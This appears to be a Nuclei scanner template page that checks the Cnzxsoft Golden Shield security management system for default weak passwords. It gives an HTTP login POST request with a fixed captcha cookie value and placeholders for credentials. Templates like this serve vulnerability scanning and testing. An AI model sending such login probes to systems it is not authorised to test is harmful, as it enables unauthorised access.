# Nuclei Template: Cnzxsoft System - Default Login
**Template ID:** cnzxsoft-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`cnzxsoft-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Cnzxsoft Golden Shield Information Security Management System has a default weak password.

## Steps to reproduce / Exploit Payload
```http
POST /?q=common/login  HTTP/1.1
Host: {{Hostname}}
Cookie: check_code=ptbh
Content-Type: application/x-www-form-urlencoded

name={{username}}&password={{password}}&checkcode=ptbh&doLoginSubmit=1
```

